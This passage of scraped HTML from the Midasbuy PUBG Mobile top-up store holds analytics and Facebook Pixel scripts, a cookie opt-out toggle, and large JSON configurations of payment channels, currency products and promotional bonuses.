                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.wrap').removeClass('special-foot');
            }
        }
        $(function () {
            setTimeout(function() {
                scrollFun();
            }, 0);
            window.addEventListener('resize', function() {
                scrollFun();
            });
            window.loadImages && window.loadImages();

          //  loadJS(document, 'script', 'gtag-jssdk','https://www.googletagmanager.com/gtag/js?id=UA-21773189-2');

            // 恢复 ga 禁用记录
            var gaSetting = window.localStorage && window.localStorage.getItem(gaKey());
            var active = gaSetting !== null ? gaSetting === 'true' : window.defaultDisableGaCountryList.indexOf(__Report_INFO.countryCode) === -1;
            var word = active ? (footerLan.cookieOn || 'ON') : (footerLan.cookieOff || 'OFF');
            $('.record-detailt-pop #gaStatus').html(word);
            if (active) {
                $('.record-detailt-pop .block .block-title .switch-box').addClass('open');
            }
            toggleGa(active);
            $('.record-detailt-pop #cookieSwitchBtn').on('click', function() {
                $(this).parent().toggleClass('open');
                var active = $(this).parent().hasClass('open');
                var word = active ? (footerLan.cookieOn || 'ON') : (footerLan.cookieOff || 'OFF');
                $('.record-detailt-pop #gaStatus').html(word);
                window.localStorage && window.localStorage.setItem(gaKey(), active);
                toggleGa(active);
            });
        });
        function toggleGa(active) {
            window['ga-disable-UA-21773189-2'] = !active;
            if (!active) {
                var topDomain = location.host.split('.').slice(-2).join('.');
                document.cookie = '_ga=;expires=-1;domain=' + topDomain + ';path=/';
                document.cookie = '_gid=;expires=-1;domain=' + topDomain + ';path=/';
                document.cookie = '_gat_gtag_UA_21773189_2=;expires=-1;domain=' + topDomain + ';path=/';
            }
        }
        function gaKey() {
            var isLogin = typeof muid !== 'undefined';
            var key = 'GASETTING_' +(isLogin ? muid : 'unlogged');
            return key;
        }
    </script>
    <script type="text/javascript">!function(){"use strict";var r="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";window.btoa||(window.btoa=function(t){for(var o,e,n=String(t),a=0,i=r,c="";n.charAt(0|a)||(i="=",a%1);c+=i.charAt(63&o>>8-a%1*8)){if((e=n.charCodeAt(a+=.75))>255)throw new Error("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");o=o<<8|e}return c}),window.atob||(window.atob=function(t){var o=String(t).replace(/[=]+$/,"");if(o.length%4==1)throw new Error("'atob' failed: The string to be decoded is not correctly encoded.");for(var e,n,a=0,i=0,c="";n=o.charAt(i++);~n&&(e=a%4?64*e+n:n,a++%4)?c+=String.fromCharCode(255&e>>(-2*a&6)):0)n=r.indexOf(n);return c})}();</script>
    <script type="text/javascript" src="/oversea_web/static/js/x-midas/foXpt24MxhVpLTWmFsULBWJ0hD79nV7v9xWmNlTyU3Bqe4AEdEhMwu9wQOZRznaiasaltyxZa4hdYZdpZTVP_4fNAGKEXIYBcBqHZ0gpIMU~.js"></script>
      
    
    
<script>
    var WebsiteHosts = ["pay.gpubgm.com","www.midasbuy.com","pay.pubgm.zing.vn","nap.codm.360mobi.vn","sandbox.midasbuy.com","pay.kingdomcraftgame.com","127.0.0.1","localhost"];
</script>
    
    <script>var throttle=function(func,wait,options){var context,args,result;var timeout=null;var previous=0;if(!options){options={}}var later=function(){previous=options.leading===false?0:+new Date();timeout=null;result=func.apply(context,args);if(!timeout){context=args=null}};return function(){var now=+new Date();if(!previous&&options.leading===false){previous=now}var remaining=wait-(now-previous);context=this;args=arguments;if(remaining<=0||remaining>wait){if(timeout){clearTimeout(timeout);timeout=null}previous=now;result=func.apply(context,args);if(!timeout){context=args=null}}else{if(!timeout&&options.trailing!==false){timeout=setTimeout(later,remaining)}}return result}};</script>
    <!-- Facebook Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s)
        {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
        n.callMethod.apply(n,arguments):n.queue.push(arguments)};
        if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
        n.queue=[];t=b.createElement(e);t.async=!0;
        t.src=v;s=b.getElementsByTagName(e)[0];
        s.parentNode.insertBefore(t,s)}(window, document,'script',
        'https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', fbPixelId || '368728074397888');
        window.fbReport.doReport('PageView');
    </script>
    <!-- End Facebook Pixel Code --> 
    <script>(function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6";
        fjs.parentNode.insertBefore(js, fjs);
      }(document, 'script', 'facebook-jssdk'));</script>
</head>
<body>
    <input type="hidden" id="xMidasToken" value="74ba19555855c6e9286a187de0bea0a82f2b1599819a06abb7c50707741859f7491213fd6cd7b9f4c701d74c194a596b">
    <input type="hidden" id="xMidasVersion" value="1.0.0">


<div class="wrap game-ticket game-wrap game_list have-pay-sec is-vip not-is-vip">
    

<div class="header-box g-clr"></div>


    <div class="header">

    <div class="main g-clr">
        
            <div class="menu-more">
                <div class="icon-box">
                    <div class="line1 line"></div>
                    <div class="line2 line"></div>
                    <div class="line3 line"></div>
                </div>
            </div>
        
        <h1 class="logo"><a class="pc" style="cursor:default" href="javascript:void(0)">midasbuy</a></h1>
        
            <div class="menu">
                <a class="active navIndexButton" href="javascript:void(0)" cr="homepage">Home</a>
                
                <a target="_blank" cr="QA" href="https://cdn.midasbuy.com/oversea_web/faq/faq.html">Help Center</a>
            </div>
        
        <div class="log">
            
                
                    
                        <div class="logined" cr="login_control">
                            <img class="user-pic" src="//cdn.midasbuy.com/images/new-user-icon723b1902.png" alt="avator"/>
                        </div>
                    
                    
                        <a href="javascript:void(0)" class="register-tips" cr="login_control_bubble">
                            <p>REGISTER TO GET <span>PUBGM FREE</span> ITEM</p>
                        </a>
                     
                
            
            
            <div class="luanch">
                <div class="country" cr="regional_select" id="country_select">
                    
                    <img class="country-icon" cr="regional_select" src="//midas.gtimg.cn/oversea_web/static/images/flag/world.2556fe97306bdec1268d8b8a935b56c5.jpg" alt="flag" />
                    
                </div>
            </div>
            
        </div>
        <div class="user-mess-box vip-mess-box">
            <div class="san"></div>
            <div class="head-box">
                <img class="top-logo" src="https://www.midasbuy.com//oversea_web/static/images/pc-logo.png" alt="img">
                <img class="close-btn" src="https://www.midasbuy.com//oversea_web/static/images/big-new-close-icon.png" alt="img">
            </div>
            <ul>
                
                <!-- 未登录 -->
                <li class="user-not-login">
                    <p class="label"></p>
                    <div class="btn-box">
                        <div class="log-in headerLoginButton">SIGN IN</div>
                        <div class="register headerLoginButton">CREATE ACCOUNT</div>
                        
                            <p class="exclusive-regist">
                                <a href="javascript:void(0)" class="user-box-tips">
                                    Get PUBGM exclusive registeration gift for <span>FREE</span>
                                </a>
                            </p>
                         
                    </div>
                </li>
                
                <li class="link check-status vipLoginButton">
                    <div class="title">Midasbuy VIP</div>
                    <div class="novip-icon">Check your status after log in</div>
                </li>
                
                <li class="link">
                    <a class="headerLoginButton" href="javascript:void(0)">
                        <p class="unlogin-account-settings">View Account</p>
                    </a>
                </li>
                
                <li class="link">
                    <a class="headerLoginButton" href="javascript:void(0)">
                        <p class="unlogin-transaction-record">Transcation Record</p>
                    </a>
                </li>
                
                
                
            </ul>
        </div>
        <div class="menu-nav-box">
            <div class="head-box">
                <img class="close-btn" src="https://www.midasbuy.com//oversea_web/static/images/big-new-close-icon.png" alt="img">
                <img class="top-logo" src="https://www.midasbuy.com//oversea_web/static/images/pc-logo.png" alt="img">
            </div>
            <ul>
                <li class="acitve navIndexButton"><a href="javascript:void(0)" cr="homepage">Home</a></li>
                
                <li class=""><a href="https://cdn.midasbuy.com/oversea_web/faq/faq.html" cr="homepage">Help Center</a></li>
            </ul>
        </div>
        <div class="bg"></div>
    </div>
    <div class="menu-nav-box-bg"></div>
</div>


        <script src="https://cdn.midasbuy.com/oversea_web/static/js/header.06c56d65.js"></script>
    

<script type="text/javascript">
    var GAME_INFO = {"offer_name":"PUBG Mobile","unit":"UnknownCash","rate":"10","count":"0","country_code":"ID","currency_type":"","channel":[{"id":"os_credit_card","name":"","key":"","appcode":"","service_id":"","pay_channel":{}},{"id":"mol","name":"","key":"poSZb92qoFgpqavNyD6oifsRhbhNGz7C","appcode":"SRAHw9dTRiMSTvYq1g6RLIVuNwNqg27f","service_id":"","pay_channel":{}},{"id":"midas_redeem","name":"","key":"","appcode":"","service_id":"","pay_channel":{}},{"id":"redeem","name":"","key":"","appcode":"","service_id":"","pay_channel":{}},{"id":"mol_zgoldcard","name":"","key":"","appcode":"","service_id":"","pay_channel":{}},{"id":"mol_razerzvault","name":"","key":"","appcode":"","service_id":"","pay_channel":{}},{"id":"os_credit_card_adyen","name":"","key":"","appcode":"","service_id":"","pay_channel":{}}],"productid_list":[{"id":"os_credit_card","productid_info":[{"name":"60 Unknow Cash","product_detail":"","productid":"os_credit_card_OT_60","price":"0","num":"60","currency_type":"USD","country":"OT"},{"name":"300 Unknow Cash","product_detail":"","productid":"os_credit_card_OT_300","price":"0","num":"300","currency_type":"USD","country":"OT"},{"name":"600 Unknow Cash","product_detail":"","productid":"os_credit_card_OT_600","price":"0","num":"600","currency_type":"USD","country":"OT"},{"name":"1500 Unknow Cash","product_detail":"","productid":"os_credit_card_OT_1500","price":"0","num":"1500","currency_type":"USD","country":"OT"},{"name":"3000 Unknow Cash","product_detail":"","productid":"os_credit_card_OT_3000","price":"0","num":"3000","currency_type":"USD","country":"OT"},{"name":"6000 Unknow Cash","product_detail":"","productid":"os_credit_card_OT_6000","price":"0","num":"6000","currency_type":"USD","country":"OT"}]},{"id":"mol_zgoldcard","productid_info":[{"name":"60 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_60","price":"0","num":"60","currency_type":"USD","country":"OT"},{"name":"120 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_120","price":"0","num":"120","currency_type":"USD","country":"OT"},{"name":"300 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_300","price":"0","num":"300","currency_type":"USD","country":"OT"},{"name":"600 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_600","price":"0","num":"600","currency_type":"USD","country":"OT"},{"name":"1200 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_1200","price":"0","num":"1200","currency_type":"USD","country":"OT"},{"name":"1500 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_1500","price":"0","num":"1500","currency_type":"USD","country":"OT"},{"name":"3000 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_3000","price":"0","num":"3000","currency_type":"USD","country":"OT"},{"name":"6000 Unknown Cash","product_detail":"","productid":"mol_zgoldcard_OT_6000","price":"0","num":"6000","currency_type":"USD","country":"OT"}]},{"id":"mol_razerzvault","productid_info":[{"name":"60 Unknown Cash","product_detail":"","productid":"mol_razerzvault_OT_60","price":"0","num":"60","currency_type":"USD","country":"OT"},{"name":"180 Unknown Cash","product_detail":"","productid":"mol_razerzvault_OT_180","price":"0","num":"180","currency_type":"USD","country":"OT"},{"name":"600 Unknown Cash","product_detail":"","productid":"mol_razerzvault_OT_600","price":"0","num":"600","currency_type":"USD","country":"OT"},{"name":"1500 Unknown Cash","product_detail":"","productid":"mol_razerzvault_OT_1500","price":"0","num":"1500","currency_type":"USD","country":"OT"},{"name":"3000 Unknown Cash","product_detail":"","productid":"mol_razerzvault_OT_3000","price":"0","num":"3000","currency_type":"USD","country":"OT"},{"name":"6000 Unknown Cash","product_detail":"","productid":"mol_razerzvault_OT_6000","price":"0","num":"6000","currency_type":"USD","country":"OT"}]}],"mol_pin_show_info":[],"pmwall_card":{},"appmode":0,"max_num":0,"productid":"","goodsname":"","goodsdes":"","unit_price":"","pmwall_cc":"","short_openid":"","charac_name":"","logic_world_list":"","mycard_info":{},"openid":"","adyen_svrtime":"","adyen_url":"","pass_is_buy":"","last_login_time":"","vgameappid":""};
    var MP_INFO = {"buycurrency":{"uptopresent_ot":{"rule_item":[{"present_item":[{"num":"60","send_type":"2","send_rate":"0","send_num":"3","send_ext":"","product_item":[]},{"num":"120","send_type":"2","send_rate":"0","send_num":"8","send_ext":"","product_item":[]},{"num":"300","send_type":"2","send_rate":"0","send_num":"40","send_ext":"","product_item":[]},{"num":"600","send_type":"2","send_rate":"0","send_num":"90","send_ext":"","product_item":[]},{"num":"1200","send_type":"2","send_rate":"0","send_num":"260","send_ext":"","product_item":[]},{"num":"1500","send_type":"2","send_rate":"0","send_num":"375","send_ext":"","product_item":[]},{"num":"3000","send_type":"2","send_rate":"0","send_num":"1000","send_ext":"","product_item":[]},{"num":"6000","send_type":"2","send_rate":"0","send_num":"2400","send_ext":"","product_item":[]}],"allow_channel":"mol:1003","currency_type":"*","currency_zone":"*","begin_time":"2020-01-14 17:00:00","end_time":"2022-07-17 23:59:59","rank_type":"range","is_limit":"no","desc":""},{"present_item":[{"num":"60","send_type":"2","send_rate":"0","send_num":"3","send_ext":"","product_item":[]},{"num":"180","send_type":"2","send_rate":"0","send_num":"18","send_ext":"","product_item":[]},{"num":"600","send_type":"2","send_rate":"0","send_num":"90","send_ext":"","product_item":[]},{"num":"1500","send_type":"2","send_rate":"0","send_num":"375","send_ext":"","product_item":[]},{"num":"3000","send_type":"2","send_rate":"0","send_num":"1000","send_ext":"","product_item":[]},{"num":"6000","send_type":"2","send_rate":"0","send_num":"2400","send_ext":"","product_item":[]}],"allow_channel":"mol:27,mol:1001","currency_type":"*","currency_zone":"*","begin_time":"2020-01-14 17:00:00","end_time":"2022-07-17 23:59:59","rank_type":"range","is_limit":"no","desc":""},{"present_item":[{"num":"60","send_type":"2","send_rate":"0","send_num":"3","send_ext":"","product_item":[]},{"num":"300","send_type":"2","send_rate":"0","send_num":"40","send_ext":"","product_item":[]},{"num":"600","send_type":"2","send_rate":"0","send_num":"90","send_ext":"","product_item":[]},{"num":"1500","send_type":"2","send_rate":"0","send_num":"375","send_ext":"","product_item":[]},{"num":"3000","send_type":"2","send_rate":"0","send_num":"1000","send_ext":"","product_item":[]},{"num":"6000","send_type":"2","send_rate":"0","send_num":"2400","send_ext":"","product_item":[]}],"allow_channel":"os_adyen:4,os_credit_card","currency_type":"*","currency_zone":"*","begin_time":"2020-01-14 17:00:00","end_time":"2022-07-17 23:59:59","rank_type":"range","is_limit":"no","desc":""}],"title":"","rule_id":"utp200102220832287"},"uptopresent4":{"rule_item":[{"present_item":[{"num":"30","send_type":"2","send_rate":"0","send_num":"0","send_ext":"限1次","product_item":[{"id":"checkin_item","name":"Gift","url":"//cdn.midasbuy.com/images/7f0c6ce68f5a42a5282aab430d3a950f387b233.png","num":"1"}]}],"allow_channel":"wechat,os_credit_card,os_credit_card:3,mol:27,mol:1001,os_codapay:52,os_codapay:48,os_codapay:24,os_codapay:45,os_codapay:46,os_codapay:43,os_adyen:4","currency_type":"*","currency_zone":"*","begin_time":"2020-10-30 00:00:00","end_time":"2021-03-15 23:59:59","rank_type":"range","is_limit":"byall","desc":"1"},{"present_item":[{"num":"30","send_type":"2","send_rate":"0","send_num":"0","send_ext":"","product_item":[]}],"allow_channel":"wechat,os_credit_card,os_credit_card:3,mol:27,mol:1001,os_codapay:52,os_codapay:48,os_codapay:24,os_codapay:45,os_codapay:46,os_codapay:43,os_adyen:4","currency_type":"*","currency_zone":"*","begin_time":"2020-10-30 00:00:00","end_time":"2021-03-15 23:59:59","rank_type":"range","is_limit":"no","desc":""}],"title":"","rule_id":"utp201029203826318"},"ruleset_id":"DRM210126000000091510","mall_url":"","result_url":"","title":"","title_url":""}};
    var CHANNEL_INFO = {"adyen_wechat":{"channel":"adyen","cssObj":{"height":200,"width":200},"currencyType":["CNY","HKD","USD"],"icon_h5":"//midas.gtimg.cn/overseaspay/images/adyen/wechat.png","icon_pc":"//midas.gtimg.cn/overseaspay/images/adyen/wechat.png","icon_pc_2":"//midas.gtimg.cn/overseaspay/images/adyen/wechat.png","isAdyen":1,"name":"Wechat","payParams":{"channel":"adyen","newtab":0,"subchannel":"wechat","wf_info":"return_qrcode=true"},"pm":"os_adyen:2","return_qrcode":true},"codapay_kh_dcb":{"channel":"codapay","currencyType":["USD"],"icon_h5":"//midas.gtimg.cn/oversea_web/static/images/paybyMobile.jpg","icon_pc":"//cdn.midasbuy.com/images/6ccfe06cc59956768bd3a7be8b0a4eed52ee26b.png","name":"Pay By Mobile","pm":"os_codapay:27","subchannel":"dcb"},"codapay_kh_wing":{"channel":"codapay","currencyType":["USD"],"icon_h5":"//midas.gtimg.cn/overseaspay/images/codapay/mo_cnl_wing_logo.jpg","icon_pc":"//midas.gtimg.cn/overseaspay/images/codapay/pc_cnl_wing_logo.jpg","icon_pc_2":"//midas.gtimg.cn/overseaspay/images/codapay/pc_cnl_wing_logo@2x.jpg","name":"WING","pm":"os_codapay:28","subchannel":"wing"},"midas_redeem":{"currencyType":["INR","IDR","USD","TRY","IQD","KWD","SAR","BHD","QAR","AED","OMR","EGP","LYD","TND","DZD","MAD","LAK","MYR","MMK","PHP","SGD","THB"],"icon_h5":"//cdn.midasbuy.com/images/midas_redeeme1abadee.png","icon_pc":"//cdn.midasbuy.com/images/midas_redeeme1abadee.png","name":"Voucher Code","pm":"redeem"},"mol_fpx":{"channel":"mol_global","currencyType":["AUD","BRL","IDR","INR","MYR","NZD","PHP","SGD","THB","TWD","USD","VND"],"icon_h5":"//midas.gtimg.cn/oversea_web/static/images/FPX.png","icon_pc":"//midas.gtimg.cn/oversea_web/static/images/FPX.png","name":"FPX","pm":"mol:12","subchannel":"mol_fpx"},"mol_gamesultan":{"channel":"mol_global","currencyType":["TRY","EUR","USD"],"icon_h5":"","icon_pc":"","icon_pc_2":"","name":"gamesultan","pm":"mol:9","subchannel":"mol_gamesultan"},"mol_maybank2u":{"channel":"mol_global","currencyType":["AUD","BRL","IDR","INR","MYR","NZD","PHP","SGD","THB","TWD","USD","VND"],"icon_h5":"","icon_pc":"","icon_pc_2":"","name":"maybank2u","pm":"mol:13","subchannel":"mol_maybank2u"},"mol_molpaycreditcard":{"channel":"mol_global","currencyType":["AUD","BRL","IDR","INR","MYR","NZD","PHP","SGD","THB","TWD","USD","VND"],"icon_h5":"","icon_pc":"","icon_pc_2":"","name":"molpaycreditcard","pm":"mol:10","subchannel":"mol_molpaycreditcard"},"mol_paypal":{"channel":"mol_global","currencyType":["AUD","BRL","IDR","INR","MYR","NZD","PHP","SGD","THB","TWD","USD","VND"],"icon_h5":"","icon_pc":"","icon_pc_2":"","name":"paypal","pm":"mol:11","subchannel":"mol_paypal"},"mol_razerzvault":{"channel":"mol_global","currencyType":["AUD","BRL","EUR","HKD","IDR","INR","MYR","NZD","PHP","SGD","THB","TWD","USD","VND","TRY","MMK","MXN","HKD"],"icon_h5":"//midas.gtimg.cn/oversea_web/static/images/Razer_Gold.png","icon_pc":"//midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png","icon_pc_2":"","name":"Razer Gold ","pm":"mol:27","restoration":{"endTime":"Thu Nov 19 2020 12:00:00 GMT+0800","startTime":"Thu Nov 05 2020 12:00:00 GMT+0800"},"subchannel":"mol_razerzvault"},"mol_rixty":{"channel":"mol_global","currencyType":["BRL","USD"],"icon_h5":"","icon_pc":"","icon_pc_2":"","name":"rixty","pm":"mol:1002","subchannel":"mol_rixty"},"mol_zgoldcard":{"channel":"mol_global","currencyType":["AUD","BRL","EUR","HKD","IDR","INR","MYR","NZD","PHP","SGD","THB","TWD","USD","VND","MXN","TRY","MMK","HKD"],"icon_h5":"//midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png","icon_pc":"//midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png","name":"Razer Gold Pin","pm":"mol:1003","subchannel":"mol_zgoldcard","type":"cashcard"},"mol_zgoldewallet":{"channel":"mol_global","currencyType":["AUD","BRL","EUR","HKD","IDR","INR","MYR","NZD","PHP","SGD","THB","TWD","USD","MXN","VND"],"icon_h5":"//midas.gtimg.cn/overseaspay/images/mol_global/mo_cnl_zgold_molpoints.png","icon_pc":"//midas.gtimg.cn/overseaspay/images/mol_global/pc_cnl_zgold_molpoints.png","icon_pc_2":"//midas.gtimg.cn/overseaspay/images/mol_global/pc_cnl_zgold_molpoints@2x.png","name":"e-Wallet","pm":"mol:1001","subchannel":"mol_zgoldewallet"},"os_boacompra":{"channel":"boacompra","currencyType":["BRL","TRY","MXN","USD"],"icon_h5":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","icon_pc":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","name":"Boacompra","pm":"os_boacompra","subchannel":""},"os_boacompra_card":{"channel":"boacompra","currencyType":["BRL","MXN","TRY","USD"],"icon_h5":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","icon_pc":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","imgs":["//midas.gtimg.cn/boacompra/credit_card/visa.png","//midas.gtimg.cn/boacompra/credit_card/mastercard.png","//midas.gtimg.cn/boacompra/credit_card/americanexpress.png","//midas.gtimg.cn/boacompra/credit_card/visaelectron.png","//midas.gtimg.cn/boacompra/credit_card/diners.png","//midas.gtimg.cn/boacompra/credit_card/hipercard.png","//midas.gtimg.cn/boacompra/credit_card/aura.png","//midas.gtimg.cn/boacompra/credit_card/elocard.png","//midas.gtimg.cn/boacompra/credit_card/personal.png",{"mx":["//midas.gtimg.cn/store_config/1599471336824UvemwojK.png","//midas.gtimg.cn/store_config/1599471350879ezAGOlbO.png","//midas.gtimg.cn/store_config/1599471367380rtokLPZy.png"],"tr":["//midas.gtimg.cn/boacompra/credit_card/visa.png","//midas.gtimg.cn/boacompra/credit_card/mastercard.png","//midas.gtimg.cn/boacompra/credit_card/visaelectron.png","//midas.gtimg.cn/boacompra/credit_card/maestro.png"]}],"name":"Card","payParams":{"channel":"boacompra","payment_group":"card","subchannel":"card"},"pm":"os_boacompra"},"os_boacompra_cash":{"channel":"boacompra","currencyType":["BRL","MXN","TRY","USD"],"icon_h5":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","icon_pc":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","imgs":[{"br":["//midas.gtimg.cn/boacompra/cash/boleto.png"],"mx":["//midas.gtimg.cn/store_config/1599469782213uvTvpgio.png","//midas.gtimg.cn/store_config/1599469829601bNmlIQU.png","//midas.gtimg.cn/store_config/1599469846005mxPrxulJ.png"]}],"name":"Cash","payParams":{"channel":"boacompra","payment_group":"cash","subchannel":"cash"},"pm":"os_boacompra"},"os_boacompra_transfer":{"channel":"boacompra","currencyType":["BRL","MXN","TRY","USD"],"icon_h5":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","icon_pc":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","imgs":["//midas.gtimg.cn/boacompra/bank_transfer/bancodobrasil.png","//midas.gtimg.cn/boacompra/bank_transfer/itau.png","//midas.gtimg.cn/boacompra/bank_transfer/banrisul.png","//midas.gtimg.cn/boacompra/bank_transfer/santander.png","//midas.gtimg.cn/boacompra/bank_transfer/bradesco.png","//midas.gtimg.cn/boacompra/bank_transfer/caixa.png",{"br":["//midas.gtimg.cn/store_config/1599470452089hr67AhtV.png","//midas.gtimg.cn/store_config/1599470491830w6ybRbBL.png","//midas.gtimg.cn/store_config/1599470517784l4C7bG3R.png","//midas.gtimg.cn/store_config/1599470538002ErB0xqb3.png"],"mx":["//midas.gtimg.cn/store_config/1599470891891WVjmmVZv.png","//midas.gtimg.cn/store_config/1599470910934LpErPYzr.jpg","//midas.gtimg.cn/store_config/1599470959778qwiV6VWR.png","//midas.gtimg.cn/store_config/1599470985697qvSbBE7g.jpg","//midas.gtimg.cn/store_config/1599471060834hyELBEj.jpg","//midas.gtimg.cn/store_config/1599471079298iOYylAlq.png","//midas.gtimg.cn/store_config/1599471095318MZm94mDE.png"],"tr":["//midas.gtimg.cn/boacompra/bank_transfer/isbank.png","//midas.gtimg.cn/boacompra/bank_transfer/granti.png","//midas.gtimg.cn/boacompra/bank_transfer/akbank.png","//midas.gtimg.cn/boacompra/bank_transfer/yapikredi.png","//midas.gtimg.cn/boacompra/bank_transfer/denizbank.png","//midas.gtimg.cn/boacompra/bank_transfer/ptt.png","//midas.gtimg.cn/boacompra/bank_transfer/kuveytturk.png","//midas.gtimg.cn/boacompra/bank_transfer/vakifbank.png","//midas.gtimg.cn/boacompra/bank_transfer/ziraatbankasi.png","//midas.gtimg.cn/boacompra/bank_transfer/teconomibank.png"]}],"name":"Transfer","payParams":{"channel":"boacompra","payment_group":"transfer","subchannel":"transfer"},"pm":"os_boacompra"},"os_boacompra_wallet":{"channel":"boacompra","currencyType":["BRL","MXN","TRY","USD"],"icon_h5":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","icon_pc":"//cdn.midasbuy.com/images/os_boacompraa8dea1d5.png","imgs":["//midas.gtimg.cn/boacompra/online_wallet/gold.png","//midas.gtimg.cn/boacompra/online_wallet/pagseguro.png","//midas.gtimg.cn/boacompra/online_wallet/paypal.png",{"br":["//midas.gtimg.cn/store_config/1599471567752tfaaKPWp.png","//midas.gtimg.cn/store_config/1599471586017hznUaVqi.png"],"mx":["//midas.gtimg.cn/store_config/1599471586017hznUaVqi.png"]}],"name":"Wallet","payParams":{"channel":"boacompra","payment_group":"online wallet","subchannel":"wallet"},"pm":"os_boacompra"},"os_paypal":{"currencyType":["AUD","BRL","CAD","CZK","DKK","EUR","HKD","HUF","INR","ILS","JPY","MYR","MXN","TWD","NZD","NOK","PHP","PLN","GBP","RUB","SGD","SEK","CHF","THB","USD"],"icon_h5":"//midas.gtimg.cn/overseaspay/images/public/logo_paypal.png","icon_pc":"//midas.gtimg.cn/overseaspay/images/public/logo_paypal.png","name":"PayPal","payParams":{"channel":"paypal_new","newtab":1},"pm":"os_paypal"},"os_skrill":{"currencyType":["EUR","USD","GBP","SEK","AED","SAR","KWD","RUB","TRY"],"icon_h5":"//cdn.midasbuy.com/images/os_skrill-h542ac8ffc.png","icon_pc":"//cdn.midasbuy.com/images/os_skrill-h542ac8ffc.png","name":"Skrill","payParams":{"channel":"skrill","isv3":1,"newtab":1},"pm":"os_skrill"},"paypal":{"currencyType":["USD"],"icon_h5":"//cdn.midasbuy.com/images/paypal5088bda5.png","icon_pc":"//cdn.midasbuy.com/images/paypal5088bda5.png","name":"Paypal","pm":"paypal:1"},"wechat":{"H5_frameHeight":"200","channel":"","cssObj":{"height":200,"width":200},"currencyType":["CNY","HKD","USD"],"icon_h5":"//midas.gtimg.cn/overseaspay/images/wechat/wechat.png","icon_pc":"//midas.gtimg.cn/overseaspay/images/wechat/wechat.png","icon_pc_2":"//midas.gtimg.cn/overseaspay/images/wechat/wechat.png","isWechat":1,"name":"微信支付","payParams":{"channel":"wechat","h5_newtab":0,"pc_newtab":0,"subchannel":""},"pm":"wechat","supportJsApi":1},"os_credit_card":{"channel":"creditcard","currencyType":["SEK","EUR","PLN","THB","EGP","MMK","INR","HKD","BRL","IDR","USD","PKR","LAK","TWD","TRY","IQD","PHP","MYR","SGD","MMK","EGP","INR","HKD","ILS","SGD","SAR","AED","KWD","AUD","RUB","CHF","GBP","EUR","QAR","BHD","MXN","ZAR","OMR","LKR","KZT","NZD"],"icon_h5":"//midas.gtimg.cn/oversea_web/static/images/card_icon.png","icon_pc":"//midas.gtimg.cn/store_config/1591583418114fLuXpvL7.png","icon_pc_2":"//midas.gtimg.cn/store_config/1591583418114fLuXpvL7.png","imgs":["//midas.gtimg.cn/oversea_web/static/images/creditcard/visa.png","//midas.gtimg.cn/oversea_web/static/images/creditcard/mastercard.png","//midas.gtimg.cn/store_config/1591840311202NFEY8rsl.jpg","//midas.gtimg.cn/store_config/1590388413020SZ0HsR7C.png","//midas.gtimg.cn/store_config/1590388424133LAvOXFfg.png","//midas.gtimg.cn/store_config/15903884360138E9JgZLy.png","//midas.gtimg.cn/store_config/1590388448535nq1ckDsi.png",{"fr":["//midas.gtimg.cn/oversea_web/static/images/creditcard/visa.png","//midas.gtimg.cn/oversea_web/static/images/creditcard/mastercard.png","//midas.gtimg.cn/store_config/1591840311202NFEY8rsl.jpg","//midas.gtimg.cn/store_config/1590388413020SZ0HsR7C.png","//midas.gtimg.cn/store_config/1590388424133LAvOXFfg.png","//midas.gtimg.cn/store_config/15903884360138E9JgZLy.png","//midas.gtimg.cn/store_config/1590388448535nq1ckDsi.png","//cdn.midasbuy.com/images/error914bd101.png"],"tr":["//midas.gtimg.cn/oversea_web/static/images/creditcard/visa.png","//midas.gtimg.cn/oversea_web/static/images/creditcard/mastercard.png","//midas.gtimg.cn/store_config/1591840311202NFEY8rsl.jpg","//midas.gtimg.cn/store_config/1590388413020SZ0HsR7C.png","//midas.gtimg.cn/store_config/1590388424133LAvOXFfg.png","//midas.gtimg.cn/store_config/15903884360138E9JgZLy.png","//midas.gtimg.cn/store_config/1590388448535nq1ckDsi.png","https://cdn.midasbuy.com/images/1600415777%281%29_meitu_297366efb.png"]}],"name":"Card","payParams":{"action":"pay","needAvs":false,"query_drm":1},"pm":"os_credit_card:1"},"codapay_kh_pipay":{"channel":"codapay","currencyType":["USD"],"icon_h5":"https://cdn.midasbuy.com/images/Pi-Paya6a8bb3c.png","icon_pc":"https://cdn.midasbuy.com/images/Pi-Paya6a8bb3c.png","name":"Pi 